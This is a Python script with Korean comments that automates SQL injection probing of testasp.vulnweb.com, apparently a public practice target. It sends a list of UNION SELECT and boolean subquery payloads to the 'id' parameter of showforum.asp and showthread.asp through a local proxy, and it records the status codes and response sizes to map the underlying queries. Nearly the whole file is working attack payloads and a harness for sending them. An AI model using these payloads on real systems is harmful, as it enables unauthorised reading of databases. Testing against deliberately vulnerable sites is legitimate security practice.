#!/usr/bin/env python3
"""Round 5 (보조) — 소스로 확인한 실제 쿼리 형태에 맞춘 UNION 재시도.

소스: rs.Open "SELECT name, descr FROM forums WHERE id=" & Request.QueryString("id"), conn
  → 2컬럼. 그런데 1~15 컬럼 스캔에서 전부 500이 나왔다. 무엇이 UNION 을 깨는지 좁힌다.
"""
import subprocess, urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]


def probe(pay):
    url = f"{BASE}/showforum.asp?id=" + urllib.parse.quote(pay)
    p = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}"]
                       + PROXY + ["-m", "25", url], capture_output=True, text=True)
    return p.stdout.strip()


cases = [
    ("기준 1", "1"),
    ("기준 0", "0"),
    ("1 AND 1=1", "1 AND 1=1"),
    ("2컬럼 UNION (주석 없음)", "1 UNION SELECT 1,2"),
    ("2컬럼 UNION --", "1 UNION SELECT 1,2--"),
    ("2컬럼 UNION -- 뒤 공백", "1 UNION SELECT 1,2-- "),
    ("2컬럼 UNION ALL --", "1 UNION ALL SELECT 1,2--"),
    ("0 UNION 2컬럼 --", "0 UNION SELECT 1,2--"),
    ("0 UNION 'a','b' --", "0 UNION SELECT 'a','b'--"),
    ("0 UNION name,descr FROM forums --", "0 UNION SELECT name,descr FROM forums--"),
    ("문자열 컬럼 추정", "0 UNION SELECT 'x','y'--"),
    ("UNION 뒤 세미콜론", "0 UNION SELECT 1,2;--"),
    ("3컬럼", "0 UNION SELECT 1,2,3--"),
    ("서브쿼리로 확인: AND (SELECT name FROM forums WHERE id=1) IS NOT NULL", "1 AND (SELECT name FROM forums WHERE id=1) IS NOT NULL"),
    ("AND (SELECT COUNT(*) FROM forums)=3", "1 AND (SELECT COUNT(*) FROM forums)=3"),
    ("AND (SELECT name FROM forums WHERE id=1)='Weather'", "1 AND (SELECT name FROM forums WHERE id=1)='Weather'"),
    ("AND (SELECT name FROM forums WHERE id=1)='Acunetix Web Vulnerability Scanner'",
     "1 AND (SELECT name FROM forums WHERE id=1)='Acunetix Web Vulnerability Scanner'"),
]
print("### 소스 기반 UNION/서브쿼리 재확인 (showforum.asp?id=)")
for label, pay in cases:
    print(f"  {label:64s} -> {probe(pay)}")

print()
print("### 같은 실험을 showthread.asp 에서 (쿼리: SELECT b.title, b.forumid, b.id as threadid, a.name FROM forums a, threads b WHERE ... b.id=<n>  → 4컬럼)")
for label, pay in [("기준 0", "0"), ("4컬럼 UNION --", "-1 UNION SELECT 1,2,3,4--"),
                   ("4컬럼 UNION ALL --", "-1 UNION ALL SELECT 1,2,3,4--"),
                   ("AND 1=1", "0 AND 1=1"), ("AND 1=2", "0 AND 1=2")]:
    url = f"{BASE}/showthread.asp?id=" + urllib.parse.quote(pay)
    p = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}"]
                       + PROXY + ["-m", "25", url], capture_output=True, text=True)
    print(f"  {label:64s} -> {p.stdout.strip()}")
